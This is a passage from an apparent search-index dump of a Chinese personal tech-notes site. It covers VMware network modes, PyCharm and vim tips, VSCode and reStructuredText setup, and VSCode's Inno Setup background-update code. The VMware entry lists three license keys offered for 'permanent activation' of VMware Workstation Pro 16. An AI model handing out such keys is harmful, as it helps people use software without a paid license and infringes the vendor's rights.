虚拟机通过连接到虚拟机交换机，利用虚拟网桥连接到主机的网卡。 它不需要用到虚拟网卡，所以没有VMware Network Adapter VMnet0。 特点 物理机和虚拟机地位平等 虚拟机占用一个独立IP 使用物理机的网卡访问互联网 配置 虚拟机IP网段和主机一致 连通情况 主机和虚拟机可以访问 虚拟机之间可以相互访问 可以访问互联网 使用场景 创建一个虚拟服务器在内网提供网络服务 NAT NAT 通信方式 虚拟NAT设备（虚拟路由）连接到VMnet8虚拟交换机——虚拟机联网用 主机通过VMware Network Adapter VMnet8虚拟网卡连接到VMnet8虚拟交换机——主机和虚拟机连接用 注解 虚拟DHCP服务器连接到VMnet8虚拟交换机 特点 虚拟机在外部网络中没有自己的IP地址 虚拟NAT设备会把专用网络中的 IP 地址转换为主机系统的 IP 地址——网络地址转换 主机可以联网，虚拟机就可以联网 配置 无 连通情况 主机和虚拟机可以访问 虚拟机之间可以相互访问 可以访问互联网 本机虚拟机可以访问其他主机 其他主机不能访问本机虚拟机。解决办法：共享网络、端口映射 使用场景 大部分情况 仅主机 仅主机 通信方式 主机使用VMware Network Adapter VMnet1虚拟网卡连接到VMnet1虚拟交换机 特点 没有了虚拟NAT设备，所以不能上网 连通情况 主机和虚拟机可以访问 虚拟机之间可以相互访问 不能访问互联网，解决办法：主机网卡共享给VMware Network Adapter VMnet1网卡 不能访问其他主机 其他主机不能访问本机虚拟机 使用场景 创建一个与其他机器隔离的网络 总结 在网络模式的区别里面，只需要记住1、特点2、使用场景就可以了。不需要记住上网到底是怎么实现的。 结论 桥接需要一个额外的IP NAT模式是最简单的 仅主机用于封闭网络 注解 原文地址: https://cloud.fynote.com/share/d/12926 访问码: 6379","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-VMware-three-network-modes.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-VMware-three-network-modes.html"},{"title":"VMware Workstation","text":"注解 VMware Workstation Pro 16 许可证密钥，批量永久激活！: ZF3R0-FHED2-M80TY-8QYGC-NPKYF YF390-0HF8P-M81RQ-2DXQE-M2UT6 ZF71R-DMX85-08DQY-8YMNC-PPHV8 当我们安装VMware Workstation后，在 宿主机 （物理电脑） 上会多出两个网卡，VMNet1、VMNet8， 在虚拟机设置里会多出一个配置 VMNet0。 vmnet1和vmnet8是两个虚拟网卡，主要作用是让虚拟机可以通过你的宿主机的网线上网。 注意：如果有\"！\"，说明不能用。 vmnet1是为host-only方式服务的，vmnet8是为NAT方式服务的。 一个是设置私有网络（Host Only）时，用来和主机通信的， 禁用以后就无法正常使用Host-Only模式了， 另一个是设置网络地址翻译（NAT）时，和主机通讯使用的， 如果禁用，那么虚拟机在NAT模式下依然可以通过主机网卡访问外网， 但不能通过内部网络和主机直接通信。 而使用桥接网络时，则不需要这两个网卡了。 通过NAT方式上网的guest系统与主机通信需要VMnet8网卡的支持， 使用Host-Only模式的guest系统与主机通信需要VMnet1网卡的支持， 使用桥接模式上网需要网络中存在DHCP服务器，且提供服务。 VMnet8提供NAT和DHCP服务，VMnet1提供DHCP服务。 VMNet1 使用的是host-only的链接模式，即虚拟机只能与主机构成内部通信，无法对外网进行访问。 VMNet8 模式： NAT网络模式 场景： 在宿主机安装多台虚拟机，和宿主组成一个小局域网， 宿主机，虚拟机之间都可以互相通信，虚拟机也可访问外网， 例如 搭建 hadoop 集群，分布式服务 使用Vmnet8虚拟交换机，此时虚拟机可以通过主机单向网络上的其他工作站，其他工作站不能访问虚拟机。 VMNet0 模式： 使用桥接模式，安装VM后，在VM里建立虚拟机 默认 就是该模式。 场景： 如果你只是需要一台虚拟机可以和宿主互通，并可以访问外网，此模式即可。 描述： 安装虚拟机系统后不需要调整网络，物理网络中的 \"路由\" 所包含的DHCP服务器会自动识别该虚拟机并为其分配IP地址； 如果没有路由，可以自己手动在系统分配，原则是和宿主机在同一网段并指向相同的网关即可通信。 虚拟机支持3种常用网络模式 参考: Vmware虚拟机三种网络模式详解 Bridge模式 虚拟机作为独立的计算，和宿主机同样连接到外部网络。 如果局域网中是DHCP，将虚拟机设置为静态ip，存在ip冲突的风险。 桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。 在桥接的作用下，类似于把物理主机虚拟为一个交换机， 所有桥接设置的虚拟机连接到这个交换机的一个接口上， 物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的， 相互可以访问而不干扰。 在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。 NAT模式 虚拟机可以访问宿主机和网络，宿主机不能访问虚拟机。 如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网， 这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。 在NAT模式中，主机网卡直接与虚拟NAT设备相连， 然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上， 这样就实现了虚拟机联网。那么我们会觉得很奇怪， 为什么需要虚拟网卡VMware Network Adapter VMnet8呢？ 原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。 Host-Only模式 虚拟机和宿主机可以互相访问，但是虚拟机不能访问网络。 Host-Only模式其实就是NAT模式去除了虚拟NAT设备， 然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的， Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。 问题总结 NAT模式下，虚拟机无法ping通物理机 虚拟机A1、A2是主机A中的虚拟机，虚拟机B1是主机B中的虚拟机。 其中的\"NAT路由器\"是只启用了NAT功能的路由器， 用来把VMnet8交换机上连接的计算机通过NAT功能连接到VMnet0虚拟交换机。 A1、A2、B1设置为NAT方式，此时A1、A2可以单向访问主机B、C，而B、C不能访问A1、A2； B1可以单向访问主机A、C，而A、C不能访问B1； A1、A2与A，B1与B可以互访。 Linux 下VMWare虚拟机下的几种网络连接方式以及和windows之间的文件传输 其他 设置IP地址的时候 以下不能使用: 192.168.191.0 代表网络号 192.168.191.255 代表广播地址 192.168.191.2 代表网关 192.168.191.1 这个被主机用了 (windows主机) 所以能用的IP地址就只有3~254了。","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Vmware-workstation.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Vmware-workstation.html"},{"title":"WIN实用工具","text":"procexp (Process Explorer) 进程资源管理器, 比自带任务管理器更专业, 可替换; 可显示有关打开或加载了哪些句柄和 DLL 进程的信息。 下载地址: learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Win-practical-tool.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Win-practical-tool.html"},{"title":"常用工具使用","text":"","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-index.html"},{"title":"配置pytest环境","text":"有时候点测试左边的三角形, 发现使用的是unittest, 于是就找了一下pytest相关的配置. 前提说明, 安装pytest及相应pytest插件, 必须安装的包: pip install pytest pytest-runner pytest.ini 这三个包貌似直接加*就行: pip install pytest* 然后看具体的测试用例使用了哪些插件, 然后去自己装. 比如定义了async异步测试函数, 需要使用asyncio标记: @pytest.mark.asyncio 这个时候就需要用到相应的插件: pip install pytest-asyncio 在Pycharm配置默认测试执行程序 默认是自动识别, 可以在以下位置查看/修改: 设置 =》 工具 =》 Python 继承工具 =》 测试 默认测试运行程序","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Configure-the-pytest-environment.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Configure-the-pytest-environment.html"},{"title":"全局查找快捷键失效","text":"主要是Windows下面, 使用 Ctrl+Shift+F 无法打开搜索窗口. 多半是输入法或者其他什么占用了此快捷键, 可以鼠标放到输入法然后右键打开设置. Win10系统输入法可能是简繁切换占用 搜狗输入法也是","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Global-Find-the-problem-of-shortcut-keys.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Global-Find-the-problem-of-shortcut-keys.html"},{"title":"Pycharm书签使用","text":"快捷键-Windows F11 : 光标所有位置添加书签 Ctrl + 单击 : 在左侧行号旁使用, 添加书签 Shift + F1 : 查看所有书签 注解 添加书签后, 还可设置编号, 如当前位置设置 1 , 即可 Ctrl + 1 , 快捷跳转. 快捷键-Mac 待补充","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Pycharm-bookmark-use.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-Pycharm-bookmark-use.html"},{"title":"Pycharm","text":"","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-index.html"},{"title":"Pycharm添加版权文件","text":"设置概览 File > Settings > Editor > Copyright > Copyright Profiles 然后添加版权文件, 随便自己命名就行 版权配置文件 新建好后在版权李设置好生效范围即可 设置生效范围 最后应用, mac下新建好文件后 command + n 直接添加版权即可 注解 windows 貌似是 alt + insert , 然后选择copyright 一些相关配置变量 Pycharm配置文件可用变量 Name Type Comment $today DateInfo 当前日期时间对象 $file.fileName String 当前文件的名称 $file.pathName String 当前文件的完整路径 $file.className String 当前文件的类名 $file.qualifiedClassName String 当前文件的权限定名 $file.lastModified DateInfo 上一次修改的日期时间对象 $project.name String 当前项目名 $module.name String 当前 Module 名 $username String 当前用户名（系统用户名） 其中, DateInfo 对象有如下属性和方法： DateInfo 对象的属性和方法 Name Type Comment year int 当前年份 month int 当前月份 day int 当前日期（1-31） hour int 当前小时（0-11） hour24 int 当前小时（0-23） minute int 当前分钟（0-59） second int 当前秒数（0-59） format(String format) String 时间日期格式化方法, 参考:java.text.SimpleDateFormat format 注解 Pycharm网上很少有这种说明, 这些还是参考的 Idea 的相关说明配置. 自定义变量的方式也没有找到, 后面找到了再补充. 另外, 也可以 直接添加模板 . 自己使用的配置 coding: utf-8 Copyright (C) 2022-${today.year}, Inc. All Rights Reserved @Time : ${today.format(\"yyyy-MM-dd\")} @Author : yan que @Email : yanquer@qq.com @File : ${file.fileName} @Project : ${project.name} 直接添加模版的方式 直接添加模板 参考配置 # coding: utf-8 # # Copyright (C) 2022-${YEAR}, Inc. All Rights Reserved # # @Time : ${DATE} ${TIME} # @Author : yan que # @Email : yanquer@qq.com # @File : ${NAME} # @Project : ${PROJECT_NAME} 注解 使用模版 与 使用版权配置文件, 任选其一即可, 都用可能会点问题(冲突会自动合并)","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-adds-copyright-files.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-adds-copyright-files.html"},{"title":"Pycharm 设置同步问题","text":"前言 将工具版本更新到 PyCharm2022.3 后, 在文件或右下角找不到同步设置的地方了, 一度以为是这个功能被砍了, 最后在设置里面找到了 设置里面新增了一个 设置同步 选项, 默认禁用, 打开即可.","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-setting-synchronization-problem.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-pycharm-setting-synchronization-problem.html"},{"title":"快捷键","text":"快捷键 idea/pycharm command option v new一个对象的时候, 自动命名, 或者定义变量时快速命名 command option <- 返回上一个位置 command option -> 去下一个位置 command shift f 全局搜索字符串 command shift r 全局替换 command f 文件内搜索字符串 command r 文件内替换 shift shift 全局搜索文件名 Win下: ctrl + alt + shift + l : 快速格式化 其他 vscode快捷键位置","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-shortcut-key.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-pycharm-shortcut-key.html"},{"title":"vim","text":"vim有四个模式 正常模式 (Normal-mode) 插入模式 (Insert-mode) 命令模式 (Command-mode) 可视模式 (Visual-mode) 简单使用: vim file #打开文件 file1 file2 #打开两个文件 -O2 file1 file2 #分屏打开两个文件。有几个O几 -o #大写O表示左右排版，小写o表示上下排版 常用快捷键 快捷键: shift + a (or A) # 快速移动到行末尾, 并进入编辑模式 dd # 删除当前行 gg # 光标跳转到文件首行 shift + g (or G) # 光标跳转文件最后一行 _ # 光标移到当前行第一个非空字符位置 v,V # 可视化模式 行号+gg # 快速移动到指定行号 i # 当前位置插入 o # 当前行下一行插入 :u # 撤销 ctrl+r # 恢复撤销 更多详见:: 精通 VIM ，此文就够了 编码格式 编码格式: :set fenc # 查看文本编码 fenc是fileencoding缩写 # 与 :set fileencoding 一样 :set fenc='filecode' # 转换当前文本的编码为指定的编码 :set enc='filecode' # 以指定的编码显示文本，但不保存到文件中 encoding缩写 # 这里的\"编码\"常见为gbk utf-8 big5 cp936 # fileencoding---fenc # encoding---enc :set invlist 显示换行符等字符 :set nolist 关闭换行符等字符显示 模式 模式: :set ff? #查看模式类型，一般为dos,unix :set ff=dos #设置模式 例如设置unix模式 :set fileformat=unix #与:set fileformat=dos一个效果 ff是缩写 # fileformat---ff # :%s/&#94;M//g等同于:set ff=unix 移动编辑 移动编辑: gg # 光标跳转到文件首行 G # 光标跳转文件最后一行 _ # 光标移到当前行第一个非空字符位置 A # 移动到行尾 v,V # 可视化模式 行号+gg #快速移动到指定行号 粘贴与复制 粘贴与复制: y # 复制当前光标所在处字符 yy # 复制当前光标所在行 p # 在当前位置粘贴上一次复制的内容 删除 删除: dd #命令模式下dd删除当前行 # 删除多行，如删除8-17行 8,17d 查找 斜杠后跟查找的字符查找: :/'what' 替换 替换: # :{作用范围}s/{目标}/{替换}/{替换标志} # 会在全局范围(%)查找foo并替换为bar，所有出现都会被替换（g）。 :%s/foo/bar/g s表示单行查找替换, %s表示全局查找替换 其他 其他: :w #保存不退出 :w #新文件名 把文件另存为新文件 :q #不保存退出 :wq #保存退出 :! #强制 :q! #强制不保存退出，用于修改文件之后，不保存数据退出 :wq! #强制保存退出，当文件的所有者或 root 用户，对文件没有写权限的时候，强制写入数据使用 :ls #查看当前编辑器所有文件 :bn #切换到第n个文件 主要是b控制的 序号可以先ls查看 便捷配置 语法高亮: vim syntax on # 语法高亮 filetype indent on # 开启文件类型检查，并且载入与该类型对应的缩进规则 set showmode # 底部显示当前模式， 如命令模式、插入模式 set showcmd # 命令模式下，底部显示当前键入的指令 set mouse=a # 支持使用鼠标 set encoding=utf-8 # 使用 utf-8 编码 set t_Co=256 # 启用256色 缩进: set autoindent # 按下回车键时，下一行缩进与上一行保持一致 set tabstop=2 # 按下tab时, vim显示的空格数 set shiftwidth # 在文本上按下>>（增加一级缩进）、<<（取消一级缩进）或者==（取消全部缩进）时，每一级的字符数。 set expandtab # 由于 Tab 键在不同的编辑器缩进不一致，该设置自动将 Tab 转为空格。 set softtabstop=2 # Tab 转为多少个空格 外观: set number # set nu 也可，显示行号 set relativenumber # 显示光标所在的当前行的行号，其他行都为相对于该行的相对行号。 set cursorline # 光标所在当前行高亮 set textwidth=80 # 设置行宽，即一行显示多少字符 set wrap # 自动折行，即太长的行分为几行显示 set nowrap # 关闭自动折行 set linebreak # 只有遇到指定的符号（比如空格、连词号和其他标点符号），才发生折行。也就是说，不会在单词内部折行。 set wrapmargin=2 # 指定折行处与编辑窗口的右边缘之间空出的字符数。 set scrolloff=5 # 垂直滚动时，光标距离顶部/底部的位置（单位：行） set sidescrolloff=15 # 水平滚动时，光标距离行首或行尾的位置（单位：字符）。该配置在不折行时比较有用。 set laststatus=2 # 是否显示状态栏。0 表示不显示，1 表示只在多窗口时显示，2 表示显示。 set ruler # 在状态栏显示光标的当前位置（位于哪一行哪一列）。 参考:: Vim 配置入门 - 阮一峰的网络日志 语法 变量 变量定义: let a=1 打印: echo &a 参考:: VIM 中文用户手册: 编写 Vim 脚本","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vim.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vim.html"},{"title":"记录vscode与rst协作遇到的一些坑","text":"语法检查 主要就是语法检查的坑 用到的拓展含 restructuredtext , 内置了 lint 语法检查, 包含三种类型 rst-check rst-lint doc8 提示 ... 插件商店有提示lint使用的是另一个插件, 我没细看, 有兴趣的自行了解吧 其中, 数 rst-lint 问题最大, vscode 在另外的地方已经有配置使用 sphinx 检查, 这里拓展使用的 rst-lint 检查默认貌似是使用的 docutils , 导致没问题的地方, 老给你标波浪线, 严重影响体验. 例如: toctree标记语法错误, 其实没问题 最后配置以下设置解决 // 禁用 rst-lint \"restructuredtext.linter.disabledLinters\" : [ \"rst-lint\" , ], // 使用 sphinx 预览 \"restructuredtext.preview.name\" : \"sphinx\" , 参考文档 restructuredtext配置 restructuredtext-linter介绍 restructuredtext-issues#386 注解 当时还在 restructuredtext-issues#386 询问了作者, 后面才看到邮件被告知确实似乎 linter 的问题, 但不是他们开发的. 然后顺手关闭了此问题... 最开始的理解是 restructuredtext 里集成了 linter , 设想 linter 可以被 restructuredtext 自动设置, 是我错了, 还是禁用吧.","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-VSCode-and-RST-collaboration.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-VSCode-and-RST-collaboration.html"},{"title":"记录一次vscode于rst协作的坑","text":"系统 macos 13 vscode 1.73.1 python 3.9.10 背景 今日看到野火的rst文档介绍, 发现使用了一样的vscode插件 reStructuredText . 但是我这边居然没有预览html的效果(无html样式, 只有空白的文字与普通样式). 处理 一开始以为有插件冲突, 去自己的已安装插件看了一下, 卸载了一些没用的插件, 无果. 于是网上冲浪, 无果 . 也去项目 release 看了, 说明了个寂寞. 最后看了一眼别人使用的版本, v155.0.0 , 去下载了这个版本的用, 居然就好了... 于是, 又试了较新的几个版本, 最开始是不行的, 后面可能是安装了推荐的插件, 最后使用最新版 v189.2.0 又可以了 暂时确定, 相关的有一个 esbonio 的 pip 包一定要有(vscode插件不用, 因为新版已内置), 去看了官网文档, 确实要 ( reStructuredText v171之后的版本已经内置了这个插件, 所以可能启动的时候会有一些bug...) (简而言之就是某些配置存在问题, 通过降级后使用的时候触发了某些正确配置, 升级后就正常了) 结语 官网文档又不说, 项目的 release 介绍也没提, 坑... 最终解决 人都傻了, 知道什么原因了, 最新版默认使用的是 docutils 所以会有这个问题, 需要手动切换配置一下, 点击 vscode 左下角设置即可(打开rst文件才有) 另外, 有一个 No module named rstcheck.__main__; 'rstcheck' is a package and cannot be directly executed 报错, 需要在 setting.json 里添加配置 \"restructuredtext.linter.rstcheck.executablePath\": \"rstcheck\" , 详情见 官网issuse 注解 相关的有一个 esbonio 的 pip 包, reStructuredText v171之后的版本默认使用 pip安装的了(没有的需要装)","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-the-pits-of-VSCode-configuration-RST.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-Record-the-pits-of-VSCode-configuration-RST.html"},{"title":"vscode不同文件配置不同缩进","text":"Command + Shift + P 打开用户设置, 参考以下设置: \"[restructuredtext]\": { // \"editor.detectIndentation\": false, \"editor.tabSize\": 2, \"editor.insertSpaces\": true, }, 一开始用的 rst 和 reStructuredText 都失败了. 最后去setting.json联想输入才知道是 restructuredtext (小写)","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCODE-different-file-configuration-different-indentation.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCODE-different-file-configuration-different-indentation.html"},{"title":"vscode预定义变量","text":"预定义变量 支持下面的预定义变量: ${workspaceFolder} 当前工作目录(根目录) ${workspaceFolderBasename} 当前文件的父目录 ${file} 当前打开的文件名(完整路径) ${relativeFile} 当前根目录到当前打开文件的相对路径(包括文件名) ${relativeFileDirname} 当前根目录到当前打开文件的相对路径(不包括文件名) ${fileBasename} 当前打开的文件名(包括扩展名) ${fileBasenameNoExtension} 当前打开的文件名(不包括扩展名) ${fileDirname} 当前打开文件的目录 ${fileExtname} 当前打开文件的扩展名 ${cwd} 启动时task工作的目录 ${lineNumber} 当前激活文件所选行 ${selectedText} 当前激活文件中所选择的文本 ${execPath} vscode执行文件所在的目录 ${defaultBuildTask} 默认编译任务(build task)的名字","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-predetermined-variable.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-predetermined-variable.html"},{"title":"vscode设置等宽字体","text":"目前只找到两种字体: Inconsolata Ubuntu Mono: Ubuntu_Mono Inconsolata 比较优雅的等宽字体，支持高分辨率，是开源的 Google Fonts 字体. Inconsolata 字体下载地址(需要科学上网): Inconsolata#standard-styles 点击右上角的下载即可: 下载好后打开文件夹, 双击 ttf 即可安装. vscode中将 Editor: Font Family设置为Inconsolata: 最前面加上字体名称即可. 或者在 setting.json 加入(内容根据现有字体) \"editor.fontFamily\": \"'Inconsolata', Menlo, Monaco, 'Courier New', monospace\" 看起来是按照顺序来找字体的, 某个字符这个字体没有就看下个. 自己下载的: ../../../../resources/tar/Inconsolata.tar.gz Ubuntu Mono UbuntuMono的github 页面 下载这四个ttf文件: Ubuntu Mono derivative Powerline Bold Italic.ttf Ubuntu Mono derivative Powerline Bold.ttf Ubuntu Mono derivative Powerline Italic.ttf Ubuntu Mono derivative Powerline.ttf vscode内设置一下即可: 'Ubuntu Mono derivative Powerline'","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-settings-equal-wide-font.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-VSCode-settings-equal-wide-font.html"},{"title":"Vscode","text":"实现探究: MacOS下设置到环境变量 Shell Command => 安装到Path","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-index.html"},{"title":"vscode后台更新探究","text":"因为想像vscode一样实现应用的后台无感更新, 所以clone下来vscode源码研究了这一部分. 对于不同的系统版本, 实现的方式不同, 这里只讨论 windows 与 macos. linux看代码貌似没支持. 前置 源码:: microsoft/vscode vscode 事件, 组件等概念, 如果要介绍会导致篇幅太多, 故略过. 如果需要自己构建, 国内目前只看到这一篇说明清楚了: 打包VSCode源码为安装程序 , 其实源码仓库readme也有指引, 不过不是很明显. 笔者使用macos, 最开始直接run的时候没成功, 后面就没管这个直接看代码, 再后面才找到要怎么构建. 更新模块的主要源码都在 src/vs/platform/update yanque@yanquedembp vscode-code % tree src/vs/platform/update src/vs/platform/update ├── common │ ├── update.config.contribution.ts │ ├── update.ts │ └── updateIpc.ts └── electron-main ├── abstractUpdateService.ts ├── updateService.darwin.ts ├── updateService.linux.ts ├── updateService.snap.ts └── updateService.win32.ts 2 directories, 8 files 对外提供的接口主要都放 common 目录下. electron-main 目录下是具体的实现. 在 electron-main 下, abstractUpdateService.ts 定义了抽象模版, 后面三个都是继承此类. updateService.darwin.ts 是针对 macos 的实现 updateService.linux.ts 是针对 linux 的实现 updateService.win32.ts 是针对 windows 的实现 abstractUpdateService 下 initialize() 定义了一个基础的判断更新逻辑, 检查用户配置的 update.mode 为 manual 表示手动更新, 退出执行 为 start 表示仅启动时候检查一次更新, 退出执行 其他值则定时检查更新. 设置的是每30s检查一次 源码: if (updateMode === 'manual') { this.logService.info('update#ctor - manual checks only; automatic updates are disabled by user preference'); return; } if (updateMode === 'start') { this.logService.info('update#ctor - startup checks only; automatic updates are disabled by user preference'); // Check for updates only once after 30 seconds setTimeout(() => this.checkForUpdates(false), 30 * 1000); } else { // Start checking for updates after 30 seconds this.scheduleCheckForUpdates(30 * 1000).then(undefined, err => this.logService.error(err)); } 经过几层调用后到了抽象类的 doCheckForUpdates() , 此抽象方法由上面提到的 updateService.darwin.ts 等具体实现. windows无感更新 实现方式依赖 inno setup , 官网文档: inno_setup_jrsoftware 只说结果, 如果支持快速更新, 则调用 build_process 的 spawn 执行类似于以下指令: VSCodeUserSetup-x64-1.76.0.exe /verysilent /update=VSCodeUserSetup-x64-1.76.0.flag /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon 其中 VSCodeUserSetup-x64-1.76.0.exe : 是下载好的安装包 /verysilent : 表示 强制静默安装，不管是否报错，都不会有任何提示 /update : vscode 自定义的参数. 见 update /nocloseapplications : 不关闭应用程序 其他: 字面意思, 任务都定义在仓库 build/win32/code.iss 下的 [Tasks] 部分(进此文件搜就看到了) 注解 真正支持后台更新的是 verysilent 与 /update /update 可以说是ts代码 与 iss 内定义脚本的一个交互. (还用了互斥锁, 不过具体实现我没看懂) 详情见: 后台更新 源码: const child = spawn(this.availableUpdate.packagePath, ['/verysilent', `/update=\"${this.availableUpdate.updateFilePath}\"`, '/nocloseapplications', '/mergetasks=runcode,!desktopicon,!quicklaunchicon'], { detached: true, stdio: ['ignore', 'ignore', 'ignore'], windowsVerbatimArguments: true }); child.once('exit', () => { this.availableUpdate = undefined; this.setState(State.Idle(getUpdateType())); }); 这里的参数一般都是通用的, 除了 /update . 这一部分涉及到 innosetup 的 iss 配置文件定义, 可参考 官网文档: inno_setup_jrsoftware /update 是vscode 使用 innosetup 自定义的一个参数, 源码如下: // VS Code will create a flag file before the update starts (/update=C:\\foo\\bar) // - if the file exists at this point, the user quit Code before the update finished, so don't start Code after update // - otherwise, the user has accepted to apply the update and Code should start function LockFileExists(): Boolean; begin Result := FileExists(ExpandConstant('{param:update}')) end; function ShouldRunAfterUpdate(): Boolean; begin if IsBackgroundUpdate() then Result := not LockFileExists() else Result := True; end; 启动部分代码如下: [Run] Filename: \"{app}\\{#ExeBasename}.exe\"; Description: \"{cm:LaunchProgram,{#NameLong}}\"; Tasks: runcode; Flags: nowait postinstall; Check: ShouldRunAfterUpdate Filename: \"{app}\\{#ExeBasename}.exe\"; Description: \"{cm:LaunchProgram,{#NameLong}}\"; Flags: nowait postinstall; Check: WizardNotSilent 结合上一部分, 能看出, 当 ShouldRunAfterUpdate 为 true (也就是安装程序后台启动静默安装且存在flag文件) 时, 将会在用户退出出程序后, 自动打开. Task定义: [Tasks] // 省略... Name: \"runcode\"; Description: \"{cm:RunAfter,{#NameShort}}\"; GroupDescription: \"{cm:Other}\"; Check: WizardSilent 可以看到, tasks 定义了 runcode 等任务, 看起来是执行什么, 不过没找到具体实现, 官网也没找到相关说明. 后台更新 补充, 后面再看了一下, 发现这部分之前认识有限, 真正支持后台更新的是 verysilent 与 /update . 而对于vscode来说, 真正有用的还是 /update . 不使用此参数时, 在vscode在允许的时候, 执行: VSCodeUserSetup-x64-1.76.0.exe /verysilent /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon 会弹出交互界面提示已经安装, 然后让你先退出. 在定义了 /update=VSCodeUserSetup-x64-1.76.0.flag 后, 安装路径将不会安装在原来的 {app} 目录下, 而是暂时先安装到 {app}\\_ 下, 最后会触发 inno_updater.exe . inno_updater.exe 是微软自己做的一个更新工具, 源码地址: microsoft/inno-updater 而在 iss 配置的源码如下, 仅看关键代码 配置当存在flag文件时(即 使用了 /update ) // file 部分 [Files] Source: \"*\"; Excludes: \"\\CodeSignSummary*.md,\\tools,\\tools\\*,\\appx,\\appx\\*,\\resources\\app\\product.json\"; DestDir: \"{code:GetDestDir}\"; Flags: ignoreversion recursesubdirs createallsubdirs Source: \"tools\\*\"; DestDir: \"{app}\\tools\"; Flags: ignoreversion Source: \"{#ProductJsonPath}\"; DestDir: \"{code:GetDestDir}\\resources\\app\"; Flags: ignoreversion // code 部分 function GetDestDir(Value: string): string; begin if IsBackgroundUpdate() then Result := ExpandConstant('{app}\\_') else Result := ExpandConstant('{app}'); end; 效果 后台安装到 _ 目录下 执行 inno_updater.exe procedure CurStepChanged(CurStep: TSetupStep); var UpdateResultCode: Integer; begin if IsBackgroundUpdate() and (CurStep = ssPostInstall) then begin CreateMutex('{#AppMutex}-ready'); while (CheckForMutexes('{#AppMutex}')) do begin Log('Application is still running, waiting'); Sleep(1000); end; // 此处执行 Exec(ExpandConstant('{app}\\tools\\inno_updater.exe'), ExpandConstant('\"{app}\\{#ExeBasename}.exe\" ' + BoolToStr(LockFileExists())), '', SW_SHOW, ewWaitUntilTerminated, UpdateResultCode); end; end; inno_updater 源码 可以去 microsoft/inno-updater clone下源码看 , 在 src/main.rs fn _main(log: &slog::Logger, args: &Vec<String>) -> Result<(), Box<dyn error::Error>> { //省略非关键代码 let code_path = PathBuf::from(&args[1]); //省略非关键代码 update(log, &code_path, \"_\", silent == \"true\") } 在 update 函数就指定了更新路径为 \"_\" 最后是通过删除文件, 并重命名的方式处理: fn move_update( log: &slog::Logger, uninstdat_path: &Path, update_folder_name: &str, ) -> Result<(), Box<dyn error::Error>> { // 省略非关键部分 // safely delete all current files delete_existing_version(log, root_path, update_folder_name)?; // move update to current for entry in fs::read_dir(&update_path)? { let entry = entry?; let entry_name = entry.file_name(); let entry_name = entry_name.to_str().ok_or(io::Error::new( io::ErrorKind::Other, \"Could not get entry name\", ))?; let mut target = PathBuf::from(root_path); target.push(entry_name); let msg = format!(\"Renaming: {:?}\", entry_name); util::retry( &msg, |attempt| { info!(log, \"Rename: {:?} (attempt {})\", entry_name, attempt); fs::rename(entry.path(), &target)?; Ok(()) }, None, )?; } // 省略非关键部分 } 将除 _ tools unins* appx 